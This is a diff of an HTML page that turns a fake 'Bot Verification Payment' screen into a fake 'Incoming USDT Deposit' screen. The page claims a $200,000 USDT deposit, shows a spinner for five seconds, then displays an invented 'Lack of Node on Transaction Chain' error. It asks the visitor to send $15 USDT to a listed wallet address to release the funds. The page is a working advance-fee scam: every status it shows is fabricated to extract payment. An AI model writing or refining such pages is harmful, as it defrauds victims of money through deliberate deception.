@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>payment gateway</title>
+  <title>Incoming USDT Deposit</title>
   <style>
     body {
       margin: 0;
@@ -11,7 +11,6 @@
       background: #0b0f14;
       color: #eaf1f8;
       display: flex;
-      flex-direction: column;
       align-items: center;
       justify-content: center;
       height: 100vh;
@@ -33,100 +32,113 @@
       color: #ffd36e;
     }
 
-    .amounts {
-      font-size: 16px;
-      margin-bottom: 24px;
+    .amount {
+      font-size: 18px;
+      margin-bottom: 12px;
     }
 
-    .progress-circle {
+    .loader {
+      width: 80px;
+      height: 80px;
+      border: 8px solid rgba(255,255,255,0.1);
+      border-top: 8px solid #36a2ef;
+      border-radius: 50%;
+      margin: 24px auto;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .error {
+      display: none;
+      margin-top: 24px;
+      padding: 16px;
+      background: rgba(255,92,92,0.1);
+      border: 1px solid #ff5c5c;
+      border-radius: 12px;
+      color: #ff5c5c;
+    }
+
+    .battery {
+      margin: 16px auto;
+      width: 60px;
+      height: 28px;
+      border: 2px solid #ff5c5c;
+      border-radius: 6px;
       position: relative;
-      width: 160px;
-      height: 160px;
-      margin: 0 auto 24px;
+      background: #1b2430;
     }
 
-    .progress-circle svg {
-      transform: rotate(-90deg);
-    }
-
-    .progress-circle circle {
-      fill: none;
-      stroke-width: 12;
-      stroke-linecap: round;
-    }
-
-    .progress-bg {
-      stroke: #2a3746;
-    }
-
-    .progress-bar {
-      stroke: #36a2ef;
-      transition: stroke-dashoffset 0.3s ease;
-    }
-
-    .progress-text {
+    .battery::after {
+      content: "";
       position: absolute;
-      top: 50%; left: 50%;
-      transform: translate(-50%, -50%);
-      font-size: 28px;
-      font-weight: bold;
-      color: #36a2ef;
+      top: 6px;
+      right: -10px;
+      width: 6px;
+      height: 16px;
+      background: #ff5c5c;
+      border-radius: 2px;
     }
 
-    .status {
-      font-size: 15px;
+    .battery-level {
+      width: 12%;
+      height: 100%;
+      background: #ff5c5c;
+    }
+
+    .wallets {
+      margin-top: 24px;
+      font-size: 14px;
+      text-align: left;
+    }
+
+    .wallets strong {
       color: #ffd36e;
-      margin-top: 12px;
+    }
+
+    .note {
+      margin-top: 16px;
+      font-size: 13px;
+      color: #9fb3c8;
     }
   </style>
 </head>
 <body>
   <div class="card">
-    <h1>Bot Verification Payment</h1>
-    <div class="amounts">
-      Requested: <strong>$50 USDT</strong><br />
-      Confirmed: <strong>$35 USDT</strong><br />
-      Pending: <strong>$15 USDT</strong>
+    <h1>Incoming USDT Deposit</h1>
+    <div class="amount">Amount: <strong>$200,000 USDT</strong></div>
+    <div class="loader" id="loader"></div>
+
+    <div class="error" id="errorBox">
+      ⚠️ Incoming Deposit Error<br />
+      Reason: Lack of Node on Transaction Chain
+      <div class="battery">
+        <div class="battery-level"></div>
+      </div>
+      <div style="margin-top: 12px;">
+        To complete the transaction, please send <strong>$15 USDT</strong> to the address below.
+      </div>
     </div>
 
-    <div class="progress-circle">
-      <svg width="160" height="160">
-        <circle class="progress-bg" cx="80" cy="80" r="70" />
-        <circle class="progress-bar" cx="80" cy="80" r="70" stroke-dasharray="440" stroke-dashoffset="440" />
-      </svg>
-      <div class="progress-text" id="progressText">1%</div>
+    <div class="wallets" id="wallets" style="display:none;">
+      <div><strong>Receiving Address:</strong><br />TSqgMJeCkgypSWGq9EWTWrnmr8vAdXM2yb</div>
+      <div style="margin-top: 12px;"><strong>Verification Payment Address:</strong><br />TY4SpRKLhXgo6KjxmbjK5CBEUhP74WbYAa</div>
     </div>
 
-    <div class="status" id="statusText">Verifying payment…</div>
+    <div class="note" id="note" style="display:none;">
+      Once the $15 USDT is confirmed, the $200,000 USDT will be released to your wallet within 5–15 minutes (average USDT processing time).
+    </div>
   </div>
 
   <script>
-    const progressBar = document.querySelector('.progress-bar');
-    const progressText = document.getElementById('progressText');
-    const statusText = document.getElementById('statusText');
-
-    let percent = 1;
-    const maxPercent = 98;
-    const radius = 70;
-    const circumference = 2 * Math.PI * radius;
-
-    function updateProgress(p) {
-      const offset = circumference - (p / 100) * circumference;
-      progressBar.style.strokeDashoffset = offset;
-      progressText.textContent = `${p}%`;
-    }
-
-    updateProgress(percent);
-
-    const interval = setInterval(() => {
-      percent++;
-      updateProgress(percent);
-
-      if (percent >= maxPercent) {
-        clearInterval(interval);
-        statusText.textContent = "Awaiting final $15 USDT for transaction release";
-      }
-    }, 100);
+    setTimeout(() => {
+      document.getElementById('loader').style.display = 'none';
+      document.getElementById('errorBox').style.display = 'block';
+      document.getElementById('wallets').style.display = 'block';
+      document.getElementById('note').style.display = 'block';
+    }, 5000); // 5 seconds
   </script>
 </body>
 </html>
